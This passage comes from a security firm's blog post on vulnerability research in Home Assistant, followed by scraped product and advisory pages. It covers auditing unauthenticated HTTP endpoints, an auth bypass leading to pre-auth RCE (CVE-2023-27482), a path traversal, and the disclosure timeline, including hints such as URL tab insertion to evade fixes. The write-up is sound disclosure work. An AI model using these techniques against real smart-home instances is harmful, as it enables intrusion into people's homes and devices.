After briefly auditing the component responsible for handling setup and authentication of WebSockets, we found that all communications going through WebSockets require authentication. This meant that there would be no way to send custom commands through the WebSockets API as an unauthenticated user, which largely reduced the pre-auth attack surface. With that said, given the multitude of interesting functionalities provided through WebSocket commands, it could be a fruitful area for future research, especially when privilege separation is properly implemented and more widely used.

### HTTP

There’s not much you can do through the web user interface without getting past the login form, but after a bit of digging, we found that there are a few intentionally unauthenticated endpoints which perform some interesting behaviour. This is made possible thanks to some configurable behaviour when registering HTTP APIs – in a way, it is possible to opt-out of authentication, which yields pre-auth attack surface! We discuss the HTTP integration in more detail below.

## Finding Interesting Integrations

Although we understood that integrations were a good place to start looking for bugs, with over a thousand integrations available, it wasn’t possible to go through each one manually. Fortunately, there are a few ways to identify interesting and widely-used integrations. For starters, an integration’s home page shows the number of installations (which have opted in to analytics) it’s being used by. The integrations [analytics page](https://analytics.home-assistant.io/integrations/) is even better as it ranks integrations by the number of Home Assistant instances they are installed on. These statistics could be used to quickly choose which integrations to spend more time on. This list isn’t comprehensive however and seems to lack a few built-in integrations.

There is also the concept of the [Integration Quality Scale](https://www.home-assistant.io/docs/quality_scale/) which assigns integrations a score based on its code quality and user experience. The most interesting to look out for are integrations marked as *internal*, which are part of Home Assistant itself and most likely to be installed on instances by default. These can be filtered by looking through the `manifest.json` files within the [`core/homeassistant/components/`](https://github.com/home-assistant/core/tree/dev/homeassistant/components) subdirectories and filtering appropriately:

```
$ cat homeassistant/components/*/manifest.json | jq 'select(.quality_scale == "internal") | .name'
"Air Quality"
"Alarm Control Panel"
...
"Zero-configuration networking (zeroconf)"
"Zone"

```

There are around 150 internal quality integrations, including the HTTP integration which we’ve noted to be particularly interesting. The next section discusses this integration in detail.

# Case Study: HTTP Integration

A lot of our focus during this research project was on integrations exposing HTTP endpoints on the Home Assistant web application. The HTTP integration makes this all possible and is a very essential part of the application so we spent some time auditing it as well as some other interesting integrations which make use of it.

We weren’t able to find much documentation about how an integration developer can use the HTTP integration to register HTTP endpoints, so the next section aims to give a basic understanding of that process as it will help us to know what to look out for when auditing. We then take a deeper look at authentication and our process for hunting for bugs.

## How To Use the HTTP Integration as a Consumer

As code, integrations are Python modules which define a `setup` or `async_setup` function in the `__init__.py` file which is called upon initialisation. This function is passed a singleton [`HomeAssistant`](https://github.com/home-assistant/core/blob/739963b5ee1a49039eb19a1831bb569dab255fcc/homeassistant/core.py#L276) object ([`hass`](https://github.com/home-assistant/core/blob/739963b5ee1a49039eb19a1831bb569dab255fcc/homeassistant/bootstrap.py#L111)) as an argument which gives the integration access to anything it will need to do its job.

The HTTP integration provides a way for other integrations to easily add HTTP APIs to the server while automatically dealing with things such as authentication and CORS. It does this by defining a [`HomeAssistantHTTP`](https://github.com/home-assistant/core/blob/739963b5ee1a49039eb19a1831bb569dab255fcc/homeassistant/components/http/__init__.py#L283) class which manages the HTTP server for Home Assistant. It gets instantiated and [set to the `hass.http` attribute](https://github.com/home-assistant/core/blob/739963b5ee1a49039eb19a1831bb569dab255fcc/homeassistant/components/http/__init__.py#L214) when the HTTP integration is setup, making it accessible to any other integration. The web server itself is built on top of [aiohttp](https://docs.aiohttp.org/en/stable/web.html).

As an integration developer, exposing a HTTP API for your integration is as simple as writing a view class that inherits the base [`HomeAssistantView`](https://github.com/home-assistant/core/blob/739963b5ee1a49039eb19a1831bb569dab255fcc/homeassistant/components/http/view.py#L35) class and calling the [`hass.http.register_view`](https://github.com/home-assistant/core/blob/739963b5ee1a49039eb19a1831bb569dab255fcc/homeassistant/components/http/__init__.py#L349) method on it. The view class needs to set a few attributes and define some methods to specify what paths and HTTP methods it should handle. The `url` attribute specifies the path on the server that the handlers will be routed to. To specify the handler functions, you define class methods whose names corresponds to the HTTP method (e.g. `get` or `post`). The `requires_auth` attribute, which is set to `True` by default is also configurable to enable or disable the default access token authentication check. This can all be seen in the definition of the [`register`](https://github.com/home-assistant/core/blob/739963b5ee1a49039eb19a1831bb569dab255fcc/homeassistant/components/http/view.py#L91-L114) method, which gets called when `register_view` is called.

As a basic, minimal [example](https://github.com/home-assistant/core/blob/739963b5ee1a49039eb19a1831bb569dab255fcc/homeassistant/components/frontend/__init__.py#L329), we can take a look at the `frontend` integration which sets up an unauthenticated HTTP endpoint to return some static data:

```
async def async_setup(hass: HomeAssistant, config: ConfigType) -> bool:
    """Set up the serving of the frontend."""
    [...]
    hass.http.register_view(ManifestJSONView())

    [...]

[...]

class ManifestJSONView(HomeAssistantView):
    """View to return a manifest.json."""

    requires_auth = False
    url = "/manifest.json"
    name = "manifestjson"

    @callback
    def get(self, request: web.Request) -> web.Response:
        """Return the manifest.json."""
        return web.Response(
            text=MANIFEST_JSON.json, content_type="application/manifest+json"
        )

```

The key things to take note of are the following:

* The view class is defined as a subclass of the `HomeAssistantView` class
* It is passed as an argument to the `hass.http.register_view` method within the integration’s setup method
* The view class defines the attributes `requires_auth`, `url` and `name`
* The view class defines the method `get` which contains the code that is run when this endpoint is requested

With this, we have a relatively simple way of identifying HTTP entrypoints.

## Authentication

As a major goal of our research was to find a pre-auth vulnerability, we naturally decided to audit how authentication is handled in the HTTP integration.

When the HomeAssistantHTTP server is [instantiated and initialised](https://github.com/home-assistant/core/blob/739963b5ee1a49039eb19a1831bb569dab255fcc/homeassistant/components/http/__init__.py#L183-L198), the `async_setup_auth` method is [called](https://github.com/home-assistant/core/blob/739963b5ee1a49039eb19a1831bb569dab255fcc/homeassistant/components/http/__init__.py#L340). This method is [defined](https://github.com/home-assistant/core/blob/ca576d45acf44530c1fe932518132f9650ad12ab/homeassistant/components/http/auth.py#L120) in the `homeassistant/components/http/auth.py` file and is responsible for [registering](https://github.com/home-assistant/core/blob/ca576d45acf44530c1fe932518132f9650ad12ab/homeassistant/components/http/auth.py#L238) middleware that will handle the authentication. We can see in the middleware method [`auth_middleware`](https://github.com/home-assistant/core/blob/ca576d45acf44530c1fe932518132f9650ad12ab/homeassistant/components/http/auth.py#L204-L236) itself how a request is authenticated:

```
    @middleware
    async def auth_middleware(
        request: Request, handler: Callable[[Request], Awaitable[StreamResponse]]
    ) -> StreamResponse:
        """Authenticate as middleware."""
        authenticated = False

        if hdrs.AUTHORIZATION in request.headers and await async_validate_auth_header(
            request
        ):
            authenticated = True
            auth_type = "bearer token"

        # We first start with a string check to avoid parsing query params
        # for every request.
        elif (
            request.method == "GET"
            and SIGN_QUERY_PARAM in request.query_string
            and await async_validate_signed_request(request)
        ):
            authenticated = True
            auth_type = "signed request"

        if authenticated:
            _LOGGER.debug(
                "Authenticated %s for %s using %s",
                request.remote,
                request.path,
                auth_type,
            )

        request[KEY_AUTHENTICATED] = authenticated
        return await handler(request)

```

There are two ways to authenticate a request; via a token in the authorisation header, or via a signature in the request query parameters for GET requests. A request is marked as authenticated if the `request["ha_authenticated"]` value is `True`. The [`async_validate_auth_header`](https://github.com/home-assistant/core/blob/ca576d45acf44530c1fe932518132f9650ad12ab/homeassistant/components/http/auth.py#L142) method is simple and defers most of the validation logic to the core auth module implemented within the [`homeassistant/auth`](https://github.com/home-assistant/core/tree/dev/homeassistant/auth) directory. We briefly audited this module but did not find any significant bugs.

Note that the auth middleware is responsible for setting the `request["ha_authenticated"]` attribute, but for authentication to be enforced, this value needs to be used somewhere. For HTTP views registered through the `hass.http.register_view` method, this is done within the [`request_handler_factory`](https://github.com/home-assistant/core/blob/739963b5ee1a49039eb19a1831bb569dab255fcc/homeassistant/components/http/view.py#L117-L176) function:

```
def request_handler_factory(
    view: HomeAssistantView, handler: Callable
) -> Callable[[web.Request], Awaitable[web.StreamResponse]]:
    """Wrap the handler classes."""
    assert asyncio.iscoroutinefunction(handler) or is_callback(
        handler
    ), "Handler should be a coroutine or a callback."

    async def handle(request: web.Request) -> web.StreamResponse:
        """Handle incoming request."""
        if request.app[KEY_HASS].is_stopping:
            return web.Response(status=HTTPStatus.SERVICE_UNAVAILABLE)

        authenticated = request.get(KEY_AUTHENTICATED, False)

        if view.requires_auth and not authenticated:
            raise HTTPUnauthorized()

        [...]

    return handle

```

If the view’s `requires_auth` attribute is `True` and the `request["ha_authenticated"]` is not, then the handler raises an error. The `requires_auth` attribute is [set to `True` by default](https://github.com/home-assistant/core/blob/da05763a5c1d2dc0a3eae532f17087afdbdf183a/homeassistant/components/http/view.py#L41) in the base `HomeAssistantView` class, but can be overwritten to disable automatic authentication checks.

This means that `grep --exclude-dir tests -r 'requires_auth = False'` is an easy and reliable grep for identifying potential pre-auth attack surface.

### Hunting For Bugs

Although our brief review of the core auth module did not reveal any significant bugs, we did identify a bug in the signed request validation method while looking at the HTTP integration’s auth middleware. The bug would allow an attacker to tamper with a request’s query parameters to reuse a valid signature to authenticate a request under a different set of query parameters. If request signing was used for sensitive endpoints where things like filenames or IDs are used in the query parameters, this could be used to potentially gain unauthorised access to a resource. However, we only found [one usage](https://github.com/search?q=repo%3Ahome-assistant/core%20async_sign_path&type=code) of signed requests being used in the Core integrations, so the impact here was minimal. We reported this to the HA devs and it was promptly [patched](https://github.com/home-assistant/core/pull/90148). We’ve published an advisory for this bug [here](https://github.com/elttam/publications/blob/master/writeups/home-assistant/signed-url-param-tampering-advisory.md).

A large part of our focus was on higher level authentication bugs within consumers of the HTTP integration using the opt-out authentication as a starting point. There weren’t many HTTP views which set the `requires_auth` attribute to `False`, so it was reasonable to look through each one. In most cases, the default authentication check is opted out of because the endpoint is intended to be a static, public resource, or the integration handles authentication in its own way. As a simple example, the Telegram bot integration has a [webhook endpoint](https://github.com/home-assistant/core/blob/74e0341d83125d1b7dd2dca6c0fc1eae66a4bd20/homeassistant/components/telegram_bot/webhooks.py#L104-L134) which disables the default authentication check. It does perform some authentication in its own way though, in this case, based on the requester’s IP address:

```
class PushBotView(HomeAssistantView):
    """View for handling webhook calls from Telegram."""

    requires_auth = False
    url = TELEGRAM_WEBHOOK_URL
    name = "telegram_webhooks"

    def __init__(self, hass, bot, dispatcher, trusted_networks):
        """Initialize by storing stuff needed for setting up our webhook endpoint."""
        self.hass = hass
        self.bot = bot
        self.dispatcher = dispatcher
        self.trusted_networks = trusted_networks

    async def post(self, request):
        """Accept the POST from telegram."""
        real_ip = ip_address(request.remote)
        if not any(real_ip in net for net in self.trusted_networks):
            _LOGGER.warning("Access denied from %s", real_ip)
            return self.json_message("Access denied", HTTPStatus.UNAUTHORIZED)

        try:
            update_data = await request.json()
        except ValueError:
            return self.json_message("Invalid JSON", HTTPStatus.BAD_REQUEST)

        update = Update.de_json(update_data, self.bot)
        _LOGGER.debug("Received Update on %s: %s", self.url, update)
        await self.hass.async_add_executor_job(self.dispatcher.process_update, update)

        return None

```

The reason why this is interesting is because it means we have some fresh attack surface to look at. Integrations which perform authentication in their own way might do so poorly, which could lead to an authentication bypass…

When looking through said integrations, we noticed one particularly interesting one: the [Home Assistant Supervisor integration](https://www.home-assistant.io/integrations/hassio/). This integration’s purpose is to allow Home Assistant Core (and hence the web application user interface) to interact with the Supervisor. It does this by proxying requests from the user to the Supervisor’s HTTP API. Given the context of the Supervisor’s role within the Home Assistant architecture, we understood this to be a very critical security boundary in which a bug could lead to severe outcomes. Auditing this integration resulted in [CVE-2023-27482](https://github.com/home-assistant/core/security/advisories/GHSA-2j8f-h4mr-qr25), a pre-authentication RCE vulnerability which we will talk about shortly.

## Incorporating Dynamic Testing

Although code review was the primary driver for the unauthenticated bugs mentioned, dynamic testing played an important part in debugging and identifying further areas that may increase the attack surface. Following the [`debugpy`](https://www.home-assistant.io/integrations/debugpy/) documentation, we were able to successfully set breakpoints and follow code in both Core and Supervisor.

When debugging the applications, we then visited the local instance with a HTTP interception proxy and began navigating through the different pages, settings and features. By exploring the application top-to-bottom and interacting with everything we could see, we were then able to sift through the HTTP history to identify interesting API calls, the data being sent through WebSockets and gain a clearer understanding of some of the data structures that may be passing through the code.

Thinking about common web vulnerability classes, we looked for key functionality that is often prone to bugs such as configuration saving, linking external services, uploading files, parsing of files or data (such as XML), and of course database lookups. When an interesting API request was identified, we then identify the code responsible for handling the request.

For example, a POST request to the path `/api/media_source/local_source/upload` can be located in the code base by grepping for `media_source/local_source`:

```
$ grep -ir 'media_source/local_source' --exclude-dir tests/
core/homeassistant/components/media_source/local_source.py:    url = "/api/media_source/local_source/upload"
core/homeassistant/components/media_source/local_source.py:        vol.Required("type"): "media_source/local_source/remove",
frontend/src/data/media_source.ts:    "/api/media_source/local_source/upload",
frontend/src/data/media_source.ts:    type: "media_source/local_source/remove",

```

We can see that the functionality is handled in `core/homeassistant/components/media_source/local_source.py` inside the [`UploadMediaView`](https://github.com/home-assistant/core/blob/ca1a12898cbf4f8218351d1d98c7ac44d34ced8e/homeassistant/components/media_source/local_source.py#L237) function. By setting a breakpoint on the `post` function, we were then able to step through and even re-run some of the method calls with different inputs to see if they may be vulnerable, such as the `MediaSourceItem.from_uri(self.hass, data["media_content_id"], None)` call to determine the parsed `media_content_id` URI. From our time following this approach, we identified a path traversal vulnerability in the `media_source` upload functionality which we’ve published an advisory for [here](https://github.com/elttam/publications/blob/master/writeups/home-assistant/media-source-arbitrary-file-write-advisory.md).

# CVE-2023-27482: Authentication Bypass in Home Assistant

The most significant vulnerability from our time researching Home Assistant was a critical authentication bypass, tracked as [CVE-2023-27482](https://github.com/home-assistant/core/security/advisories/GHSA-2j8f-h4mr-qr25). elttam’s full advisory detailing the vulnerabilities and Proof-of-Concept can be found [here](https://github.com/elttam/publications/blob/master/writeups/home-assistant/supervisor-authentication-bypass-advisory.md).

The finding resided in the Supervisor integration which allowed for a remote unauthenticated attacker to achieve Remote Code Execution (RCE) on the target Home Assistant instance, and consequently, full access to control all smart home devices, stored data and credentials, and also internal access to the home network.

Reporting the initial vulnerability was relatively straight forward. However, the patching process wasn’t overly smooth and could be improved in future for both the remediation workflow and security advisory details to help ensure users are provided adequate information to understand the severity and applicability of a given vulnerability.

Initially, various minor [fixes](https://github.com/home-assistant/core/pull/88921/files) were made to the code base and merged into regular commits between versions, on top of this, the disclosure by Home Assistant was published over a week after two versions had been pushed to the repository with very little information suggesting the commits had anything to do with a security vulnerability. We discovered various workarounds to the mitigations that were put in place which included techniques such as inserting tabs or other special characters into the URL that were ignored by the handler. Home Assistant developers were quick to push out further [fixes](https://github.com/home-assistant/supervisor/commit/2ae2d0e1070067b2b47bdfecfb44eca697b964fd) to the workarounds, however no further updates to the advisory were made and the fixes were once again merged quietly into day-to-day commits and version releases.

A few days before we commenced the blog, we also identified another entry point within the `/api/hassio_ingress` endpoint on the Supervisor integration, although the Home Assistant Core fixes introduced in 2023.3.2 prevented the exploitation of the issue, the universal updates released in the Supervisor code base aimed at protecting older versions of core were not sufficient and exposed the platform once again. It wasn’t until Home Assistant Core version 2023.3.2 and Supervisor [2023.03.3](https://github.com/home-assistant/supervisor/commit/cede47e95c1349831b52ad354cdaf915ce18bca6) that our workarounds were no longer exploitable despite the advisories still referencing versions 2023.3.0 (core) and 2023.03.1 (Supervisor).

Further to this, the Home Assistant [forums](https://community.home-assistant.io/t/disclosure-supervisor-security-vulnerability/544977) and sites such as [ycombinator](https://news.ycombinator.com/item?id=35075961) and [reddit](https://www.reddit.com/r/homeassistant/comments/11lrqbo/disclosure_supervisor_security_vulnerability/) were home to [many [1]](https://community.home-assistant.io/t/disclosure-supervisor-security-vulnerability/544977/33) [comments [2]](https://community.home-assistant.io/t/disclosure-supervisor-security-vulnerability/544977/85) showing that the potential full impact of the vulnerability was not clear. This vulnerability also affected [Home Assistant Cloud](https://www.nabucasa.com), a partner service offered by Nabu Casa, which was not explicitly mentioned in the announcement – [some [1]](https://community.home-assistant.io/t/disclosure-supervisor-security-vulnerability/544977/34) [comments [2]](https://community.home-assistant.io/t/disclosure-supervisor-security-vulnerability/544977/13) indicated that users were unsure if they were affected or not. Fortunately, this did spark some useful [discussions](https://community.home-assistant.io/t/disclosure-supervisor-security-vulnerability/544977/127) regarding assumptions about the (lack of) security provided by random hostnames and even potential risks involved when using the Nabu Casa service.

Ultimately, the vulnerability is exploitable as long as the Home Assistant instance runs the Supervisor component with the Supervisor integration and is reachable via the internet or through local network access – random hostnames or TLS do not provide any form of protection in this case. The simplest way to avoid being at risk from a remote attacker is to not expose the instance to the internet. We encourage users to consider VPN services like [Tailscale](https://tailscale.com/) which make remote access simple and secure.

## Timeline

A timeline of the disclosure process was as follows:

* **17/02/2023** - We begin researching the Home Assistant Supervisor Integration and discover the vulnerability
* **20/02/2023** - Vulnerability report sent to security@home-assistant.io
* **27/02/2023** - Follow up email sent to confirm receipt of report
* **28/02/2023** - Confirmation of receipt from Home Assistant
* **01/03/2023** - Home Assistant replies detailing plans to release hardening fixes, request a CVE and publish a blog post
* **01/03/2023** - CVE-2023-27482 reserved
* **01/03/2023** - Home Assistant 2023.3.0 is released, containing [hardening](https://github.com/home-assistant/core/pull/88921/files) in the HTTP integration security filters middleware
* **08/03/2023** - Home Assistant Supervisor 2023.03.1 is released, containing [hardening](https://github.com/home-assistant/supervisor/commit/2ae2d0e1070067b2b47bdfecfb44eca697b964fd) in the security middleware
* **09/03/2023** - Home Assistant 2023.3.2 is released, containing further fixes in the Supervisor integration
* **09/03/2023** - Home Assistant publishes blog post and [advisory](https://github.com/home-assistant/core/security/advisories/GHSA-2j8f-h4mr-qr25)
* **21/03/2023** - Bypass affecting Home Assistant Core <=2023.3.1 discovered and reported to vendor
* **21/03/2023** - Confirmation of receipt from Home Assistant
* **22/03/2023** - Home Assistant Supervisor 2023.03.2 is released, containing [mitigation](https://github.com/home-assistant/supervisor/commit/2ae2d0e1070067b2b47bdfecfb44eca697b964fd) against the bypass
* **26/03/2023** - Bypass affecting Home Assistant Core <=2023.3.1 and Supervisor <=2023.03.2 discovered
* **27/03/2023** - Bypass reported to vendor
* **28/03/2023** - Confirmation of receipt from Home Assistant
* **29/03/2023** - Home Assistant Supervisor 2023.03.3 is released, containing [mitigation](https://github.com/home-assistant/supervisor/commit/cede47e95c1349831b52ad354cdaf915ce18bca6) against the bypass
* **03/05/2023** - Draft blog post shared with Home Assistant
* **04/05/2023** - Feedback on blog post received from Home Assistant
* **04/05/2023** - [Advisory](https://github.com/home-assistant/core/security/advisories/GHSA-2j8f-h4mr-qr25) updated to reflect correct versions
* **10/05/2023** - Public release of elttam advisories and blog post

# Conclusion

This post covered our team’s journey on hacking away at Home Assistant. We hope that we were able to provide some insights about how we approached finding high severity vulnerabilities in a large project through mostly manual code review guided by an analysis of the attack surface. We were only able to cover so much ground in the time we had and there are a lot of interesting features and attack surfaces we might not have thought about. We would love to see further security research into Home Assistant especially as the project and smart homes in general continue to grow in popularity.

Our advisories for the vulnerabilities we reported to Home Assistant during this research project can be found [here](https://github.com/elttam/publications).

Thanks for reading!

[Home](/) •[Blog](/blog)
#### Blog Post

PwnAssistant - Controlling /home's via a Home Assistant RCE

![Feature image](/assets/images/blog/2023-05-10-pwnassistant/cover.png)
### Latest Posts

[October 2024 - A Monocle on Chronicles](/blog/monocle-on-chronicles/)

[August 2024 - DUCTF 2024 ESPecially Secure Boot Writeup](/blog/ductf24-especially-secure-boot/)

[July 2024 - plORMbing your Prisma ORM with Time-based Attacks](/blog/plorming-your-primsa-orm/)

[June 2024 - plORMbing your Django ORM](/blog/plormbing-your-django-orm/)

[January 2024 - Keeping up with the Pwnses](/blog/talkback-intro/)

[October 2023 - Exploring the STSAFE-A110](/blog/stsafe-a110/)

### About elttam

elttam is a globally recognised, independent information security company, renowned for our advanced technical security assessments.

Read more about our services at [elttam.com](https://www.elttam.com)

Connect with us on [LinkedIn](https://www.linkedin.com/company/elttam)

Follow us at [@elttam](https://www.twitter.com/elttam)

## Latest Posts

[![Blog](/assets/images/blog/2024-10-03-monocle-on-chronicles/cover.webp)](/blog/monocle-on-chronicles/)
[A Monocle on Chronicles](/blog/monocle-on-chronicles/)

By Matt
October 02, 2024

This post provides an overview of Talkback Chronicles for viewing snapshots of trending infosec resources for points in time, and also how to subscribe to a new weekly Newsletter feature.

infosec
tool
talkback

[![Blog](/assets/images/blog/2024-07-30-ductf24-especially-secure-boot/cover.png)](/blog/ductf24-especially-secure-boot/)
[DUCTF 2024 ESPecially Secure Boot Writeup](/blog/ductf24-especially-secure-boot/)

By daniel
August 01, 2024

This blog post covers a DUCTF 2024 pwn challenge called "ESPecially Secure Boot", which required writing an exploit for CVE-2018-18558.

hardware
iot
esp32
esp-idf
xtensa
reverse-engineering
embedded
cve-2018-18558
mcu

[![Blog](/assets/images/blog/2024-07-09-plormbing-your-prisma-orm/cover.gif)](/blog/plorming-your-primsa-orm/)
[plORMbing your Prisma ORM with Time-based Attacks](/blog/plorming-your-primsa-orm/)

By Alex Brown
July 08, 2024

Part two of our ORM Leak series about attacking the Prisma ORM and leaking sensitive data in a time-based attack.

ORM
ORM Leaks
Prisma
Web

##### get in touch

## Let's Secure Your Future Together

Are you open to an initial chat to get to know us more?

Drop us a note now and we will get in touch shortly.

[![Logo](/assets/images/elttam_logo_full_orange_black 1.svg)](/)
hello@elttam.com

Key: [A105DCB5.gpg](/A105DCB5.gpg)

Suite 193, Level 1 East
678 Victoria St
Richmond, VIC, 3121

SERVICES
[Security Testing](/security-testing)
[Adversary Simulation](/adversary-simulation-red-team)
[Applied Research](/applied-research)

[Blog](/blog)
[Labs](/labs)
[About Us](/about-us)
[Contact Us](/contact)

© 2024 elttam Pty Ltd. ABN 46 779 503 499, ACN 605
531 502



=== Content from www.home-assistant.io_3aa78d90_20250115_115528.html ===


[2025.1.2](/blog/2025/01/03/release-20251/ "Latest version 2025.1.2 released January  9, 2025")

* [Getting started](/installation/)
* [Documentation](/docs/)
  + [Installation](/installation/)
  + [Automations](/docs/automation/)
  + [Dashboards](/dashboards/)
  + [Voice assistants](/voice_control/)
  + [Device organization](/docs/organizing/)
  + [Energy management](/docs/energy/)
  + [Advanced configuration](/docs/configuration/)
* [Integrations](/integrations/)
* [Blog](/blog/)
* [Need help?](/help/)

# Awakenyour home

Open source home automation that puts local control and privacy first. Powered by a worldwide community of tinkerers and DIY enthusiasts.

[Get started](/installation/)
[View live demos](https://demo.home-assistant.io)
[Browse 3000+ integrations](/integrations/)

[![GitHub logo](/images/frontpage/hero-github-logo.svg)
![Top open source project trophy](/images/frontpage/hero-trophy.svg)

**Top open source project** by contributors in 2024](https://github.blog/news-insights/octoverse/octoverse-2024/#the-state-of-open-source)

[![Home Assistant screenshot](/images/frontpage/hero_screenshot.png)](https://demo.home-assistant.io/)

# Recent Blog Posts

1. [3…2…1… Backup](/blog/2025/01/03/3-2-1-backup/)
   January 3, 2025
2. [2025.1: Backing Up into 2025!](/blog/2025/01/03/release-20251/)
   January 3, 2025
3. [The era of open voice assistants has arrived](/blog/2024/12/19/voice-preview-edition-the-era-of-open-voice/)
   December 19, 2024
4. [Voice Chapter 8 - Assist in the home today](/blog/2024/12/19/voice-chapter-8-assist-in-the-home/)
   December 19, 2024

[We are a non-profit and can't be sold or acquired.

Home Assistant is a project by the Open Home Foundation.](https://www.openhomefoundation.org/blog/announcing-the-open-home-foundation/)
[Read our founder's vision for the perfect home automation](/blog/2016/01/19/perfect-home-automation/)
# Alexa, turn on the lights

Use Alexa to control Home Assistant.
[Learn more](/cloud/)

# Ok Google, turn off the AC

Use Google Assistant to control Home Assistant.
[Learn more](/cloud/)

# Join The Community

Our vibrant community is very active and super friendly. We love to talk and share our passion for home automation.
 [Forums](https://community.home-assistant.io)
 [Chat](/join-chat/)
 [Newsletter](/newsletter/)

[Home Assistant Voice Preview Edition

Bring choice to voice - the best way to get started with voice](/voice-pe/)
[Home Assistant Green

The easy-to-use, versatile, and trustworthy smart home hub for everyone.](/green/)
[Home Assistant Connect ZBT-1

Best way to add Zigbee and Thread to Home Assistant](/connectzbt1/)
[Home Assistant Yellow

Home Assistant Yellow is your Matter-ready, upgradeable, and extendable smart home hub. You won't need anything else.](/yellow/)
[Home Energy Management

Monitor your energy usage, transition to sustainable energy and save money](/home-energy-management/)

[State of the Open Home 2024

Learn about our progress so far and also the roadmap for this year.](/blog/2024/04/24/state-of-the-open-home-2024/)

[Control your home with Assist

Our private, insanely fast, voice assistant running on affordable
hardware. Now supporting wake words.](/voice_control/)

[Join the Home Assistant t-shirt revolution!

Look sharp in blue, black or gray. Wearing a HA t-shirt is okay.](https://home-assistant-store.creator-spring.com/)

## Features

Works with over 1000 brands

Home Assistant integrates with over a thousand different devices
and services.

Once started, Home Assistant will automatically scan your network for
known devices and allow you to easily set them up.

[EXPLORE INTEGRATIONS](/integrations)

Powerful automations

Once you have integrated all your devices at home, you can unleash Home
Assistant’s advanced automation engine to make your home work for you.

* Turn on the light when the sun sets or when coming home
* Alert you when you leave your garage door open.

[EXPLORE AUTOMATIONS](/docs/automation)

Versatile dashboards

Home Assistant dashboards allow you to display information about your smart home. Dashboards are customizable and provide a powerful way to manage your home from your mobile or desktop.

* Easily create and customize your dashboards with drag-and-drop.
* Different card types to visualize your data and control your smart home devices.

[EXPLORE DASHBOARDS](/dashboards)

Assist, our voice assistant

Assist allows you to control Home Assistant using natural language. It is built on top of an open voice foundation and powered by knowledge provided by our community.

* Customize your voice assistant and experiment with AI conversations.
* Use Assist everywhere on your mobile phone, tablets, smartwatches, and even old-school telephones.

[EXPLORE ASSIST](/voice_control/)

Extend your system with add-ons

Home Assistant is not just limited to Home Assistant. Easily install
other applications that will help you manage your home.

* Run AdGuard, a DNS-based ad blocker
* Run third party automation engines like NodeRed
* Turn Home Assistant into a Spotify Connect target

[EXPLORE ADD-ONS](/addons)

All your smart home data stays local

Home Assistant keeps your data local, no need for a cloud.

Home Assistant communicates with your devices locally, and will fallback
to pulling in data from the cloud if there is no other option. No data
is stored in the cloud, and everything is processed locally.

Companion Mobile Apps

Use the official Home Assistant apps, a convenient companion to quickly
control your devices and be notified when things happen in your home,
even on your wrist using the Apple Watch.

The apps can also be used to send your location home to use presence
detection as part of your automations. Data is sent directly to your
home, no access by third-parties.

[DOWNLOAD APPS](https://companion.home-assistant.io/)

Home Energy Management

Home Assistant allows you to get on top of your energy use with its
home energy management feature. Gain new insights,
optimize your solar panel production, plan energy usage and save money.

[LEARN MORE](/home-energy-management/)

Home Assistant Cast

Take over all the screens. Home Assistant Cast makes every TV a display for dashboards.

[LEARN MORE](/blog/2019/08/06/home-assistant-cast/)

NFC Tags

Use NFC to bring music to your life or automate the mundane.

[LEARN MORE](/blog/2020/09/15/home-assistant-tags/)

## In the press

Trusted by home automation experts and more than a million households.

[![The Verge logo](/images/press/theverge.svg)](https://www.theverge.com/2021/9/16/22678088/home-assistant-amber-smart-home-hub-specs-release-date-price)
[![ArsTechnica.com logo](/images/press/arstechnica.svg)](https://arstechnica.com/information-technology/2021/03/how-to-achieve-smart-home-nirvana-or-home-automation-without-subscription/)
[![Tweakers.net logo](/images/press/tweakers.png)](https://tweakers.net/reviews/8704/paulus-schoutsen-home-assistant-concurreert-met-alles-wat-via-de-cloud-gaat.html)
[![Linus Tech Tips logo](/images/press/ltt.svg)](https://www.youtube.com/watch?v=x7pSkVarixU)
[![Troy Hunt logo](/images/press/troyhunt.jpg)](https://www.troyhunt.com/iot-unravelled-part-1-its-a-mess-but-then-theres-home-assistant/)
[![Tom's Hardware logo](/images/press/tomshardware.svg)](https://www.tomshardware.com/news/raspberry-pi-home-assistant-amber)
[![ProductHunt.com logo](/images/press/producthunt.com.png)](https://www.producthunt.com/posts/home-assistant)
[![Linux.com logo](/images/press/linux.com.png)](https://www.linux.com/news/home-assistant-python-approach-home-automation-video)
[![OpenSource.com logo](/images/press/opensource.com.svg)](https://opensource.com/article/17/7/home-automation-primer)
[![Linux Magazine logo](/images/press/LinuxMagazine.png)](http://www.linux-magazine.com/Issues/2017/203/Home-Assistant)
[![Ct logo](/images/press/ct.png)](https://www.heise.de/select/ct/2017/26/1513910625909214)

## The Home Assistant project is sponsored by

[![Nabu Casa logo](/images/sponsors/nabu_casa.svg)](https://www.nabucasa.com)

![Home Assistant](/images/footer-logo-text.svg)

Home Assistant is a project from the [Open Home Foundation](https://www.openhomefoundation.org/), sponsored by [Nabu Casa](https://www.nabucasa.com/).

### Join us and contribute!

* [GitHub repo](https://github.com/home-assistant/)
* [Developers Portal](https://developers.home-assistant.io)
* [Design Portal](https://design.home-assistant.io)
* [Data Science Portal](https://data.home-assistant.io)
* [Community Forum](https://community.home-assistant.io)
* [Reporting issues](/help/reporting_issues/)
* [Community Merch Store](https://home-assistant-store.creator-spring.com/)

### System status

* [Integration Alerts](https://alerts.home-assistant.io)
* [Security Alerts](/security/)
* [System Status](https://status.home-assistant.io)

### Companion apps

* [iOS and Apple devices](https://apps.apple.com/us/app/home-assistant/id1099568401)
* [Android and Wear OS](https://play.google.com/store/apps/details?id=io.homeassistant.companion.android)
* [...and more!](https://companion.home-assistant.io/)

### Governance

* [Privacy Notices](/privacy/)
* [Contributor License Agreement](/developers/cla/)
* [Terms of Service](/tos/)
* [Code of Conduct](/code_of_conduct/)
* [Credits](/developers/credits/)
* [License](/developers/license/)

### Follow us

[Sign up for our newsletter](https://building.open-home.io/#/portal)

Contact us [here](/cdn-cgi/l/email-protection#d8b0bdb4b4b798b0b7b5bdf5b9ababb1abacb9b6acf6b1b7) for media and partnership inquiries. (No technical support!)

Website powered by [Jekyll](https://jekyllrb.com/)

Originally based on the [Oscailte theme](https://github.com/coogie/oscailte)

[![Deploys by Netlify Badge](/images/frontpage/netlify.svg)](https://www.netlify.com)



=== Content from github.com_c5ef1f08_20250114_200002.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fhome-assistant%2Fcore%2Fsecurity%2Fadvisories%2FGHSA-2j8f-h4mr-qr25)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
